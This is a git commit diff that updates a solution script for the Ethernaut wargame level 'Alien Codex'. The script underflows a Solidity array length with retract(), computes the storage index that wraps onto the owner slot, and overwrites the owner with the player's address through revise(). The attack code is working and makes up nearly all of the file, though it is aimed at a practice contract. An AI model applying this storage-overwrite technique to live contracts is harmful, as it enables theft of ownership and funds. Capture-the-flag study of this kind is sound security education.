82d0cd142e94919edbb53705f7c62a9c7ecbac55
Aryan Malik <aryanhunny98@gmail.com>
2024-07-05 19:04:14 +0530

    Corrected the solution of 19 - Alien Codex

--- Ethernaut/answers/19.Alien Codex.js
+++ Ethernaut/answers/19.Alien Codex.js
@@ -1,13 +1,21 @@
 /*
-    Explaination will come up later on
+    Well explained in README.md
 */
 
+//  calling the makeContract function to set contract as true
 await contract.makeContract()
 
+// calling the retract contract such that codex length becomes less than 0, and we got the access to whole storage
 await contract.retract()
 
-p = web3.utils.keccak256(web3.eth.abi.encodeParameters(["uint256"], [1]))
+// Getting the slot from where the codex starts, means it's data
+const mapLengthAddress = "0x0000000000000000000000000000000000000000000000000000000000000001";
+const mapStartSlot = BigNumber.from(ethers.utils.keccak256(mapLengthAddress));
 
-content = '0x' + '0'.repeat(24) + player.slice(2) 
+// Getting the index of Owner in the codex
+const NUMBER_OF_SLOTS = BigNumber.from("2").pow("256");
+const ownerPositionInMap = NUMBER_OF_SLOTS.sub(mapStartSlot);
 
-await contract.revise(i, content) 
+// Overriding the poistion of owner slot using revise function with player's address
+const parsedAddress = ethers.utils.hexZeroPad(player.address, 32);
+await contract.revise(ownerPositionInMap, parsedAddress);
